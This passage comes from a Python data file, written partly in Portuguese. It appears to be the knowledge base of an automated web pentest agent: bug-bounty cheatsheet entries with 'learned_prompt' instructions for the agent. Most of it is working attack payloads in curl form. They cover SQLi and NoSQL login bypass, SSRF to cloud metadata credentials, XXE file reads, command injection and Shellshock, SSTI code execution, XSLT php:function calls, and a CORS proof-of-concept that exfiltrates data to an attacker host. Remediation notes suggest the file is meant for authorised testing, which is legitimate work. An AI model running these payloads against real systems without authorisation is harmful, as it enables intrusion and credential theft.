        "learned_prompt": "POST to /login with: ' OR '1'='1, admin'--, {\"password\":{\"$ne\":null}}. Spoof X-Forwarded-For: 127.0.0.1. Try sa:sa, admin:admin.",
        "affected_phases": ["P14", "P19"],
        "affected_skills": ["risk_assessment", "vuln-auth-bypass", "vuln-injection"],
        "recommended_tools": ["curl", "curl-headers", "sqlmap", "hydra", "jwt_tool", "ffuf"],
        "learned_techniques": [
            {"name": "Auth SQLi via form login", "phase": "P14", "tool": "curl-headers"},
            {"name": "Auth SQLi via JSON login", "phase": "P14", "tool": "curl-headers"},
            {"name": "NoSQL type juggling auth bypass", "phase": "P14", "tool": "curl-headers"},
            {"name": "X-Forwarded-For/Host spoofing", "phase": "P14", "tool": "curl-headers"},
            {"name": "JWT alg=none", "phase": "P14", "tool": "jwt_tool"},
            {"name": "Default-creds baseline probe", "phase": "P14", "tool": "curl-headers"},
        ],
    },
    {
        "title": "curl probes - Security headers + cookie flags audit",
        "vulnerability_type": "Security Misconfiguration",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet"],
        "summary": "Auditoria rapida de cabecalhos de seguranca e flags de cookie via curl - feedback imediato sem ferramentas pesadas.",
        "steps_to_reproduce": """
1) HEAD request com follow:
   curl -sk -I -L https://T/

2) Verificar headers de seguranca:
   curl -sk -I https://T/ | grep -iE 'strict-transport-security|content-security-policy|x-frame-options|x-content-type-options|referrer-policy|permissions-policy'

3) Cookie flags:
   curl -sk -i https://T/login | grep -i set-cookie
   # Procurar por ausencia de: HttpOnly, Secure, SameSite

4) CORS misconfig:
   curl -sk -i https://T/api/me -H "Origin: https://attacker.com" | grep -i 'access-control'
   # Bandeira vermelha: Access-Control-Allow-Origin: https://attacker.com + Allow-Credentials: true

5) CSP analise:
   curl -sk -I https://T/ | grep -i 'content-security-policy'
   # Procurar 'unsafe-inline', 'unsafe-eval', http: data: em script-src

6) Cache poisoning vector:
   curl -sk -i https://T/ -H "X-Forwarded-Host: evil.com"
   curl -sk -i https://T/ -H "X-Host: evil.com"

7) Public file leaks:
   for f in robots.txt sitemap.xml .git/config .env .DS_Store backup.zip web.config phpinfo.php; do
     curl -sk -o /dev/null -w "%{http_code} https://T/$f\\n" "https://T/$f"
   done

EVIDENCE TO CAPTURE:
  - Headers ausentes (HSTS, CSP, X-Frame-Options)
  - Set-Cookie sem HttpOnly/Secure/SameSite
  - Access-Control-Allow-Origin permissivo
  - 200 em /.git/config ou /web.config
""",
        "impact": "Clickjacking, MITM, XSS facilitado, CSRF cross-site, source-code leak via .git/web.config, cache poisoning.",
        "remediation": "Configurar HSTS/CSP/XFO/XCTO/Referrer/Permissions; HttpOnly+Secure+SameSite em cookies; remover .git de webroot; CORS allowlist por origem.",
        "learned_mission": "Toda iteracao de RECON deve incluir curl -I + curl -i em / e /login, e probes para .git/config, .env, web.config. Custo zero, cobertura enorme.",
        "learned_prompt": "Always run `curl -I https://T/` first and grep security headers. Probe /.git/config, /.env, /web.config, /backup.zip. Check Set-Cookie flags.",
        "affected_phases": ["P05", "P06", "P21", "P22"],
        "affected_skills": ["asset_discovery", "tech-http-fingerprint", "tech-owasp-header-analysis", "vuln-information-disclosure"],
        "recommended_tools": ["curl", "curl-headers", "httpx", "nuclei", "nikto"],
        "learned_techniques": [
            {"name": "Security headers audit", "phase": "P05", "tool": "curl-headers"},
            {"name": "Cookie flags audit", "phase": "P05", "tool": "curl-headers"},
            {"name": "CORS misconfig probe", "phase": "P05", "tool": "curl-headers"},
            {"name": "Cache-poisoning headers", "phase": "P05", "tool": "curl-headers"},
            {"name": "Sensitive file disclosure probe", "phase": "P21", "tool": "curl-headers"},
        ],
    },
    {
        "title": "curl probes - SSRF / Open Redirect (EdOverflow)",
        "vulnerability_type": "Server-Side Request Forgery",
        "source_kind": "vendor_cheatsheet",
        "source_urls": [
            "https://github.com/EdOverflow/bugbounty-cheatsheet",
            "https://raw.githubusercontent.com/EdOverflow/bugbounty-cheatsheet/master/cheatsheets/ssrf.md",
        ],
        "summary": "Validacao curl de SSRF (gopher/dict/file, AWS metadata, IPv6, xip.io) e open redirect. Caracteristica: parametros como ?url=, ?next=, ?image=, ?callback=, ?webhook=, ?api=.",
        "steps_to_reproduce": """
1) Identificar parametros candidatos (recon):
   curl -sk -i "https://T/?url=https://example.com"
   # Indicadores: body da resposta contem dados de example.com

2) AWS metadata service:
   curl -sk -i "https://T/?url=http://169.254.169.254/latest/meta-data/"
   curl -sk -i "https://T/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

3) Localhost / loopback obfuscado:
   curl -sk -i "https://T/?url=http://127.0.0.1/"
   curl -sk -i "https://T/?url=http://0177.1/"             # octal
   curl -sk -i "https://T/?url=http://2130706433/"          # decimal
   curl -sk -i "https://T/?url=http://0x7f.0x0.0x0.0x1/"   # hex
   curl -sk -i "https://T/?url=http://[::1]/"               # IPv6
   curl -sk -i "https://T/?url=http://[::]/"                # IPv6 zero
   curl -sk -i "https://T/?url=http://0/"                   # null

4) Protocolos exoticos:
   curl -sk -i "https://T/?url=gopher://localhost:25/"
   curl -sk -i "https://T/?url=dict://localhost:11211/stats"
   curl -sk -i "https://T/?url=file:///etc/passwd"
   curl -sk -i "https://T/?url=php://filter/convert.base64-encode/resource=index.php"

5) Wildcard DNS (bypass de allowlist por dominio):
   curl -sk -i "https://T/?url=http://10.0.0.1.nip.io/"
   curl -sk -i "https://T/?url=http://customer.10.0.0.1.xip.io/"

6) Open redirect:
   curl -sk -I "https://T/?next=https://attacker.com"
   curl -sk -I "https://T/?url=//attacker.com"
   curl -sk -I "https://T/?next=/%09/attacker.com"
   curl -sk -I "https://T/?url=//%2f%2eattacker.com"
   curl -sk -I "https://T/?url=/\\\\attacker.com"
   # Sucesso = Location: para dominio externo

7) OOB via interactsh:
   interactsh-client -v &
   curl -sk -i "https://T/?url=http://<id>.oast.fun/"
   # Sucesso = callback no listener

EVIDENCE TO CAPTURE:
  - Body da resposta contem instance-id / iam credentials
  - Latency anormal indicando hit em IP interno
  - Location: 3xx para dominio externo
  - Callback no interactsh
""",
        "impact": "Roubo de credenciais cloud (IAM), pivot para servicos internos, leak de arquivos, phishing via redirect.",
        "remediation": "Allowlist por dominio; bloquear IPs internos/metadata; allow only http/https; deny redirects cross-origin sem explicit consent.",
        "learned_mission": "Todo parametro do tipo ?url=/next=/redirect=/image=/webhook= deve ser testado contra metadata (169.254.169.254), gopher://, dict://, file://, e redirect externo. Custo: 8 requests curl.",
        "learned_prompt": "Probe ?url= with http://169.254.169.254/latest/meta-data/, gopher://, file:///etc/passwd, IPv6 [::1], decimal IP. For redirect: //attacker, /%09/attacker, /\\attacker.",
        "affected_phases": ["P13", "P16"],
        "affected_skills": ["risk_assessment", "vuln-ssrf-redirect"],
        "recommended_tools": ["curl", "curl-headers", "interactsh-client", "nuclei"],
        "learned_techniques": [
            {"name": "AWS metadata SSRF", "phase": "P13", "tool": "curl-headers"},
            {"name": "Localhost obfuscation", "phase": "P13", "tool": "curl-headers"},
            {"name": "Gopher/dict/file protocols", "phase": "P13", "tool": "curl-headers"},
            {"name": "DNS wildcard bypass (xip/nip)", "phase": "P13", "tool": "curl-headers"},
            {"name": "Open redirect chain", "phase": "P13", "tool": "curl-headers"},
            {"name": "OOB via interactsh", "phase": "P13", "tool": "interactsh-client"},
        ],
    },
    {
        "title": "curl probes - XXE (POST XML body)",
        "vulnerability_type": "XML External Entity",
        "source_kind": "vendor_cheatsheet",
        "source_urls": [
            "https://github.com/EdOverflow/bugbounty-cheatsheet",
            "https://raw.githubusercontent.com/EdOverflow/bugbounty-cheatsheet/master/cheatsheets/xxe.md",
        ],
        "summary": "Sondagens XXE via curl em endpoints que aceitam Content-Type: application/xml ou text/xml (SOAP, RSS, SAML, OOXML, SVG).",
        "steps_to_reproduce": """
0) Identificar endpoints XML-aware:
   curl -sk -i -X POST https://T/api/endpoint -H "Content-Type: application/xml" -d '<foo/>'
   # Se 200/400 com mensagem XML, prosseguir

1) XXE direto (file read):
   curl -sk -i -X POST https://T/api/endpoint \\
        -H "Content-Type: application/xml" \\
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

2) XXE blind (OOB via attacker):
   curl -sk -i -X POST https://T/api/endpoint \\
        -H "Content-Type: application/xml" \\
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<id>.oast.fun/dtd"> %xxe;]><foo/>'

3) XXE via base64 (binarios):
   curl -sk -i -X POST https://T/api/endpoint \\
        -H "Content-Type: application/xml" \\
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>'

4) XXE -> SSRF:
   curl -sk -i -X POST https://T/api/endpoint \\
        -H "Content-Type: application/xml" \\
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'

5) SOAP envelope com XXE:
   curl -sk -X POST https://T/soap \\
        -H "Content-Type: text/xml; charset=utf-8" \\
        -H "SOAPAction: \"\"" \\
        --data '<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body>&xxe;</soap:Body></soap:Envelope>'

6) JSON-disfarcado-de-XML (Content-Type swap):
   curl -sk -i -X POST https://T/api/json-endpoint \\
        -H "Content-Type: application/xml" \\
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
   # Algumas APIs JSON aceitam XML sem validar Content-Type

EVIDENCE TO CAPTURE:
  - Conteudo de /etc/passwd no body da resposta
  - Callback OOB no interactsh
  - Latency anormal indicando hit DTD remoto
""",
        "impact": "Leak de arquivos do servidor, SSRF para metadata cloud, DoS por billion-laughs, RCE via expect:// quando PHP loaded.",
        "remediation": "Desabilitar external entities no parser XML (libxml_disable_entity_loader); validar Content-Type estritamente; rejeitar DTDs.",
        "learned_mission": "Endpoints com Content-Type XML/SOAP/SAML devem receber sempre 3 probes: direto SYSTEM file, OOB DTD, e SSRF para metadata.",
        "learned_prompt": "POST XML with <!ENTITY xxe SYSTEM 'file:///etc/passwd'>, also OOB via http://<id>.oast.fun/, also SSRF via http://169.254.169.254/.",
        "affected_phases": ["P12", "P13", "P16"],
        "affected_skills": ["risk_assessment", "vuln-injection", "vuln-ssrf-redirect"],
        "recommended_tools": ["curl", "curl-headers", "interactsh-client", "wapiti"],
        "learned_techniques": [
            {"name": "XXE direct file read", "phase": "P12", "tool": "curl-headers"},
            {"name": "XXE blind OOB", "phase": "P12", "tool": "curl-headers"},
            {"name": "XXE base64 wrapper", "phase": "P12", "tool": "curl-headers"},
            {"name": "XXE -> SSRF metadata", "phase": "P13", "tool": "curl-headers"},
            {"name": "SOAP envelope XXE", "phase": "P12", "tool": "curl-headers"},
        ],
    },
    {
        "title": "curl probes - RCE / Shellshock / Command injection",
        "vulnerability_type": "Remote Code Execution",
        "source_kind": "vendor_cheatsheet",
        "source_urls": [
            "https://github.com/EdOverflow/bugbounty-cheatsheet",
            "https://raw.githubusercontent.com/EdOverflow/bugbounty-cheatsheet/master/cheatsheets/rce.md",
        ],
        "summary": "Probes curl para command injection em param/header, Shellshock em User-Agent/Referer/Cookie, e Werkzeug debugger.",
        "steps_to_reproduce": """
1) Command injection em parametro:
   curl -sk -i "https://T/?q=test;id"
   curl -sk -i "https://T/?q=test|id"
   curl -sk -i "https://T/?q=test\\`id\\`"
   curl -sk -i "https://T/?q=test\\$(id)"
   curl -sk -i "https://T/?q=test%26%26id"   # &&
   curl -sk -i "https://T/?q=test%0aid"      # newline

2) Shellshock em CGI (User-Agent / Referer / Cookie):
   curl -sk -i https://T/cgi-bin/test.cgi -A '() { :; }; echo; echo "Vuln: $(id)"'
   curl -sk -i https://T/cgi-bin/test.cgi -H 'Referer: () { :; }; /bin/cat /etc/passwd'
   curl -sk -i https://T/cgi-bin/test.cgi --cookie '() { :; }; ping -c 1 <id>.oast.fun'
   # Procurar em /cgi-bin/, .pl, .sh, .py CGI

3) Werkzeug debugger (Flask em DEBUG=True):
   curl -sk -i https://T/<wrong-path>
   # Se status 500 com console, tentar:
   curl -sk -i "https://T/console" -A "stríng"      # Cyrillic 'i' to trigger error

4) Command injection bypass de filtros:
   curl -sk -i "https://T/?q=test;{ls,-la}"
   curl -sk -i "https://T/?q=test;cat\$IFS/etc/passwd"
   curl -sk -i "https://T/?q=test;cat\${IFS}/etc/passwd"
   curl -sk -i "https://T/?q=test;ca''t /etc/passwd"
   curl -sk -i "https://T/?q=test;cat /et?/p?sswd"

5) Pingback OOB:
   curl -sk -i "https://T/?q=test;curl http://<id>.oast.fun"
   curl -sk -i "https://T/?q=test;wget http://<id>.oast.fun"
   curl -sk -i "https://T/?q=test;nslookup <id>.oast.fun"

EVIDENCE TO CAPTURE:
  - Output de `id`/`uname` no body
  - Callback HTTP/DNS no interactsh
  - Tempo de resposta anomalo (sleep injection)
  - Werkzeug debugger console
""",
        "impact": "Execucao arbitraria de codigo no servidor, web shell drop, exfiltration.",
        "remediation": "Nunca passar input do usuario para shell; usar APIs parametrizadas (subprocess com args list); chroot/seccomp; atualizar bash para >=4.3 (Shellshock).",
        "learned_mission": "Para CGI/Python/Node endpoints, sempre testar Shellshock em User-Agent e command injection com ; | && $() em params. Pingback via interactsh confirma blind RCE.",
        "learned_prompt": "Inject ;id, |id, $(id), `id`, %0aid in every param. Send User-Agent: () { :; }; echo vuln to /cgi-bin/. Use interactsh for blind confirmation.",
        "affected_phases": ["P12", "P14", "P19"],
        "affected_skills": ["risk_assessment", "vuln-injection"],
        "recommended_tools": ["curl", "curl-headers", "interactsh-client", "nuclei"],
        "learned_techniques": [
            {"name": "Command injection in param", "phase": "P12", "tool": "curl-headers"},
            {"name": "Shellshock via User-Agent", "phase": "P12", "tool": "curl-headers"},
            {"name": "Werkzeug debugger discovery", "phase": "P12", "tool": "curl-headers"},
            {"name": "Filter bypass via brace/IFS", "phase": "P12", "tool": "curl-headers"},
            {"name": "Pingback OOB blind RCE", "phase": "P12", "tool": "interactsh-client"},
        ],
    },
    {
        "title": "curl probes - XSS reflexivo (header e param) com indicador",
        "vulnerability_type": "Cross-Site Scripting",
        "source_kind": "vendor_cheatsheet",
        "source_urls": [
            "https://github.com/EdOverflow/bugbounty-cheatsheet",
            "https://raw.githubusercontent.com/EdOverflow/bugbounty-cheatsheet/master/cheatsheets/xss.md",
        ],
        "summary": "Probes curl que detectam reflexao bruta de input em HTML/atributo/JS sem necessidade de browser headless. Cobre Referer, User-Agent, X-Forwarded-Host, query params.",
        "steps_to_reproduce": """
1) Canary mark (string unica nao codificada):
   MARK='\\\"x><scriPt>SK0X</scrIpt>'
   curl -sk "https://T/?q=$MARK" | grep -F "$MARK"
   # Se aparecer literal, ha XSS reflexivo bruto

2) Reflexao via header:
   curl -sk "https://T/" -A '"><scrIpt>SK0X</scrIpt>'      | grep -F 'scrIpt>SK0X'
   curl -sk "https://T/" -e '"><scrIpt>SK0X</scrIpt>'      | grep -F 'scrIpt>SK0X'      # Referer
   curl -sk "https://T/" -H 'X-Forwarded-Host: "><scrIpt>SK0X</scrIpt>' | grep -F SK0X
   curl -sk "https://T/" -H 'X-Forwarded-For: "><scrIpt>SK0X</scrIpt>'   | grep -F SK0X
   curl -sk "https://T/" -H 'Cookie: name="><scrIpt>SK0X</scrIpt>'       | grep -F SK0X

3) Reflexao em contexto JS string:
   curl -sk "https://T/?q=';alert(1);//" | grep -F "';alert(1);//"

4) Reflexao em atributo:
   curl -sk 'https://T/?q=" onmouseover=alert(1) x="' | grep -F 'onmouseover=alert(1)'

5) Payloads WAF-bypass (Wordfence/Incapsula):
   curl -sk 'https://T/?q=<meter onmouseover="alert(1)"'
   curl -sk 'https://T/?q=<iframe/onload="alert(1)">'
   curl -sk 'https://T/?q=<svg onload=alert(1)>'
   curl -sk 'https://T/?q=<img/src=q onerror="alert(1)">'

6) AngularJS template (se sandbox 1.0-1.5):
   curl -sk 'https://T/?q={{constructor.constructor("alert(1)")()}}'

7) JSONP callback fuzz:
   curl -sk 'https://T/api/data?callback=SK0X' | head -c 100 | grep -F SK0X
   # Se calback() envolvendo JSON, ha JSONP -> potencial XSS via Content-Type

EVIDENCE TO CAPTURE:
  - Canary aparece literalmente no HTML (nao escapado)
  - Content-Type: text/html quando deveria ser JSON
  - Header reflection no body sem encoding
""",
        "impact": "Cookie theft, session hijack, credential phishing, defacement, drive-by exploit chain.",
        "remediation": "Context-aware output encoding; strict CSP com nonce; HttpOnly+Secure+SameSite cookies; rejeitar Content-Type swap.",
        "learned_mission": "Para cada query/header refletivo, injetar canary unico via curl e fazer grep. Se literal aparecer, escalar para dalfox/XSStrike.",
        "learned_prompt": "Send a unique canary mark via ?q=, User-Agent, Referer, X-Forwarded-Host. Grep response. If canary unescaped, mark XSS and run dalfox.",
        "affected_phases": ["P12"],
        "affected_skills": ["risk_assessment", "vuln-injection"],
        "recommended_tools": ["curl", "curl-headers", "dalfox", "nuclei"],
        "learned_techniques": [
            {"name": "Canary reflection in param", "phase": "P12", "tool": "curl-headers"},
            {"name": "Canary reflection in User-Agent", "phase": "P12", "tool": "curl-headers"},
            {"name": "Canary in Referer/X-Forwarded-Host", "phase": "P12", "tool": "curl-headers"},
            {"name": "JS-context single quote breakout", "phase": "P12", "tool": "curl-headers"},
            {"name": "Attribute context breakout", "phase": "P12", "tool": "curl-headers"},
            {"name": "JSONP callback content-type swap", "phase": "P12", "tool": "curl-headers"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # PRINCIPIO DE ORQUESTRACAO: recon dirige tudo. Sem hipotese, sem tool.
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Recon-First Orchestration - cada ferramenta requer uma hipotese (EdOverflow tips)",
        "vulnerability_type": "Methodology",
        "source_kind": "vendor_cheatsheet",
        "source_urls": [
            "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/bugbountytips.md",
            "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/recon.md",
        ],
        "summary": "O recon nao e uma fase isolada - e o motor que gera hipoteses para todas as fases seguintes. Cada execucao de ferramenta tem que responder a pergunta: 'qual evidencia me leva a essa hipotese e qual signal eu espero ver?'.",
        "steps_to_reproduce": """
PRINCIPIO: SEM HIPOTESE, SEM EXECUCAO

Fluxo correto:
  recon evidencia X -> hipotese H -> ferramenta T com payload P -> sinal S -> finding F

1) Recon orquestrado (recon.md):
   # Certificate transparency mining
   curl https://certspotter.com/api/v0/certs?domain=T | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\\*\\.//g' | uniq
   # crt.sh
   curl -s "https://crt.sh/?q=%25.T&output=json" | jq -r '.[].name_value' | sort -u
   # passive sources
   subfinder -d T -all -silent | anew subs.txt
   amass enum -passive -d T | anew subs.txt
   assetfinder -subs-only T | anew subs.txt
   # active resolve + probe
   dnsx -l subs.txt -silent | httpx -silent -title -tech-detect -status-code -tls-probe -json > alive.json
   # service scan
   naabu -host T -top-ports 1000 -silent | nmap -sV -sC -iL - -oA scan
   # JS/Endpoint mining
   katana -u https://T -d 5 -jc -kf all -silent
   gau T | uro | anew urls.txt
   waybackurls T | anew urls.txt
   # parameter discovery
   arjun -i alive.txt -oT params.txt --stable
   paramspider -d T

2) Cada finding de recon GERA hipotese (fazer JOIN no agente):
   Evidencia                                 Hipotese gerada
   X-AspNet-Version: 4.0.30319            -> H1: SQLi em ASP/MSSQL (?id=,?search=)
   X-Powered-By: PHP                      -> H2: SQLi em PHP/MySQL + LFI
   Set-Cookie: ASPSESSIONID (no HttpOnly) -> H3: XSS p/ session-steal
   Access-Control-Allow-Origin: <origin>   -> H4: CORS misconfig
   ?next=,?url=,?redirect= no URL          -> H5: open-redirect + CRLF + SSRF
   Content-Type: application/xml aceito    -> H6: XXE
   /cgi-bin/ no path                       -> H7: Shellshock
   .git/HEAD = 200                         -> H8: source-code disclosure
   robots.txt expoe /admin/                -> H9: directory fuzzing direcionado
   wpscan: WordPress detectado            -> H10: plugin CVE + xmlrpc

3) Cada hipotese tem signal de validacao OBJETIVO:
   H1 SQLi: WAITFOR DELAY '0:0:5' -> latency >5s
   H3 XSS:  canary refletido literal -> grep no body
   H4 CORS: ACAO==Origin atacante + credentials=true
   H5 redirect: Location: para dominio externo
   H7 Shellshock: User-Agent payload retorna `id` no body
   H8 .git: status 200 + content "ref:" no header HEAD

4) Bibliografia recon-driven:
   * Sublist3r/Amass/Subfinder paralelo (recon.md)
   * Aquatone p/ visual recon
   * relative-url-extractor em JS
   * GIT como recon tool (bugbountytips Tip#1)
   * GitLab /explore sem auth (Tip#2)
   * Hackathon assets (Tip#5)
""",
        "impact": "Sem orquestracao recon-first, ferramentas pesadas (sqlmap, nuclei) rodam no escuro: caro, ruidoso, e produz FP. Com hipoteses, cada execucao tem PoC predizivel.",
        "remediation": "n/a (este e um learning de metodologia, nao de defesa).",
        "learned_mission": "Antes de qualquer execucao em VULN_ANAL ou EXPLOITATION, o supervisor DEVE consultar o engine de hipoteses. Hipotese tem campos {target, param, signal_esperado, confidence}. Se a hipotese nao existe, o tool nao executa.",
        "learned_prompt": "Don't run sqlmap unless there's a URL param. Don't run dalfox unless something reflects. Don't run wpscan unless WordPress detected. Every tool maps 1:1 to a recon-derived hypothesis.",
        "affected_phases": ["P01", "P02", "P03", "P04", "P05", "P06"],
        "affected_skills": [
            "asset_discovery", "reconnaissance", "recon-subdomain-enum",
            "recon-web-crawl", "recon-port-service", "tech-http-fingerprint",
        ],
        "recommended_tools": [
            "subfinder", "amass", "assetfinder", "dnsx", "httpx", "naabu", "nmap",
            "katana", "gau", "waybackurls", "arjun", "paramspider", "whatweb", "curl-headers",
        ],
        "learned_techniques": [
            {"name": "Cert transparency mining", "phase": "P01", "tool": "curl-headers"},
            {"name": "Passive subdomain pipeline", "phase": "P01", "tool": "subfinder"},
            {"name": "Active resolve + probe", "phase": "P02", "tool": "httpx"},
            {"name": "JS endpoint mining", "phase": "P03", "tool": "katana"},
            {"name": "Parameter discovery", "phase": "P04", "tool": "arjun"},
            {"name": "Hypothesis generation from evidence", "phase": "P05", "tool": "curl-headers"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # CORS misconfig — curl-based PoC
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "CORS misconfiguration probe (EdOverflow cors.md)",
        "vulnerability_type": "CORS Misconfiguration",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/cors.md"],
        "summary": "Detecta CORS misconfig que permite leitura cross-origin com credenciais. Hipotese: 'API aceita Origin de qualquer dominio e devolve ACAC=true'.",
        "steps_to_reproduce": """
1) Verificar reflexao do Origin:
   curl -sk --head 'https://T/api/v1/me' -H 'Origin: https://evil.com' | grep -iE 'access-control-allow-(origin|credentials)'

2) Confirmar pre-flight:
   curl -sk -i -X OPTIONS 'https://T/api/v1/me' \\
        -H 'Origin: https://evil.com' \\
        -H 'Access-Control-Request-Method: GET' \\
        -H 'Access-Control-Request-Headers: Authorization'

3) Bandeira critica (vulneravel):
   Access-Control-Allow-Origin: https://evil.com
   Access-Control-Allow-Credentials: true

4) Variantes de bypass:
   curl -sk --head 'https://T/api' -H 'Origin: https://T.evil.com'      # subdominio attacker
   curl -sk --head 'https://T/api' -H 'Origin: null'                     # null origin
   curl -sk --head 'https://T/api' -H 'Origin: https://T'                # cliente-mesmo-dominio? checa enforcement

5) PoC HTML (capture):
   <script>
     fetch('https://T/api/v1/me', {credentials:'include'})
       .then(r=>r.text()).then(t=>fetch('https://attacker/?d='+btoa(t)));
   </script>
""",
        "impact": "Leak de dados autenticados (perfil, sessao, JWT) para origin atacante, account takeover via leak de token, leitura de endpoints internos quando session cookie e enviada.",
        "remediation": "Allowlist explicito de origins; nunca refletir o Origin do request; quando credentials=true, ACAO precisa ser dominio especifico (nao *).",
        "learned_mission": "Para toda API com Authorization/Cookie, rodar `curl --head -H 'Origin: https://evil.com'` no minimo 1x e checar ACAO+ACAC.",
        "learned_prompt": "Probe Access-Control-Allow-Origin reflection with Origin: https://evil.com. If Allow-Credentials=true and ACAO=evil, mark CORS misconfig critical.",
        "affected_phases": ["P05", "P16"],
        "affected_skills": ["risk_assessment", "tech-http-fingerprint", "vuln-information-disclosure", "vuln-api-graphql"],
        "recommended_tools": ["curl", "curl-headers", "nuclei", "wapiti"],
        "learned_techniques": [
            {"name": "CORS Origin reflection", "phase": "P05", "tool": "curl-headers"},
            {"name": "CORS pre-flight test", "phase": "P05", "tool": "curl-headers"},
            {"name": "CORS null/subdomain bypass", "phase": "P05", "tool": "curl-headers"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # Template Injection (Ruby/Twig/Jinja/Smarty/FreeMarker)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "SSTI - server-side template injection (EdOverflow template-injection.md)",
        "vulnerability_type": "Template Injection",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/template-injection.md"],
        "summary": "Hipotese: 'Input do usuario chega num render de template (Jinja/Twig/Ruby/FreeMarker)'. Probe deterministico: enviar {{7*'7'}} e verificar se body retorna 7777777 (Jinja) ou 49 (Twig).",
        "steps_to_reproduce": """
0) Pontos de injecao tipicos:
   - email subject/body, name, search, comentario, profile bio
   - error pages refletindo o input
   - PDF/Word generators que recebem texto

1) Probe Jinja2 / Twig:
   curl -sk "https://T/?name={{7*7}}"        # render '49' se Twig/Jinja
   curl -sk "https://T/?name={{7*'7'}}"      # '49' Twig, '7777777' Jinja
   curl -sk "https://T/?name=${7*7}"         # FreeMarker, Spring, JSP EL
   curl -sk "https://T/?name=<%=7*7%>"       # Ruby ERB, ASP

2) Probe Ruby:
   curl -sk "https://T/?name=<%=\\`id\\`%>"
   curl -sk "https://T/?name=#{7*7}"

3) Confirmar engine (Jinja exec):
   curl -sk "https://T/?name={{config.items()}}"
   curl -sk "https://T/?name={{''.__class__.__mro__[2].__subclasses__()}}"
   curl -sk "https://T/?name={{cycler.__init__.__globals__.os.popen('id').read()}}"

4) Twig exec:
   curl -sk "https://T/?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

5) FreeMarker:
   curl -sk "https://T/?name=<#assign x=\"freemarker.template.utility.Execute\"?new()>\${x('id')}"

EVIDENCE TO CAPTURE:
  - resposta contem '49', '7777777' ou output de comando
  - stacktrace mencionando jinja2, twig, freemarker
""",
        "impact": "RCE em alguns engines (Jinja/Twig/Ruby ERB), leak de variaveis internas (env, secrets), DoS via {{7*''*}}.",
        "remediation": "Nunca renderizar input do usuario via Template.render(); usar sandbox; allowlist de filtros; PreCompiled templates.",
        "learned_mission": "Em todo campo refletido que NAO escapa caracteres { } < > %, enviar {{7*'7'}} e ${7*7}. Se houve mudanca no output -> SSTI candidato.",
        "learned_prompt": "Inject {{7*'7'}}, ${7*7}, <%=7*7%>, #{7*7} in every reflected field. Confirm engine via subclass walk for Jinja, registerUndefinedFilterCallback for Twig.",
        "affected_phases": ["P12", "P14"],
        "affected_skills": ["risk_assessment", "vuln-injection"],
        "recommended_tools": ["curl", "curl-headers", "dalfox", "wapiti", "nuclei"],
        "learned_techniques": [
            {"name": "Jinja/Twig probe 7*'7'", "phase": "P12", "tool": "curl-headers"},
            {"name": "Ruby ERB probe <%=`id`%>", "phase": "P12", "tool": "curl-headers"},
            {"name": "FreeMarker Execute.new()", "phase": "P12", "tool": "curl-headers"},
            {"name": "Jinja subclass RCE", "phase": "P12", "tool": "curl-headers"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # XSLT injection
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "XSLT injection (EdOverflow xslt.md)",
        "vulnerability_type": "XSLT Injection",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xslt.md"],
        "summary": "Hipotese: 'endpoint aceita XML/XSL p/ transformacao (PDF gen, RSS, SOAP, sitemap)'. Probe: vendor disclosure + PHP function call.",
        "steps_to_reproduce": """
1) Vendor/version disclosure:
   curl -sk -X POST 'https://T/transform' -H 'Content-Type: application/xml' --data '
   <?xml version="1.0"?>
   <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
     <body>
       <xsl:value-of select="system-property(\\'xsl:vendor\\')"/>
       <xsl:value-of select="system-property(\\'xsl:version\\')"/>
     </body>
   </html>'

2) PHP function execution (php-xsl loaded):
   <xsl:value-of name="x" select="php:function('phpinfo')"/>
   <xsl:value-of name="x" select="php:function('system','id')"/>

3) File read via document():
   <xsl:value-of select="document('file:///etc/passwd')"/>

EVIDENCE TO CAPTURE:
  - vendor revelado (libxslt/Saxon/Xalan)
  - phpinfo() / id output no body
""",
        "impact": "RCE em libxslt+php-xsl, file read via document(), DoS via include recursivo.",
        "remediation": "Desabilitar php:function via XSLTProcessor::registerPHPFunctions(false); allowlist de stylesheets; rejeitar input externo.",
        "learned_mission": "Endpoints PDF/RSS/SOAP que aceitam XML + transformacao XSL devem receber probe de system-property('xsl:vendor') antes de qualquer exploit.",
        "learned_prompt": "Send XSL document with system-property('xsl:vendor'). If output reveals vendor, escalate to php:function('system','id').",
        "affected_phases": ["P12"],
        "affected_skills": ["risk_assessment", "vuln-injection"],
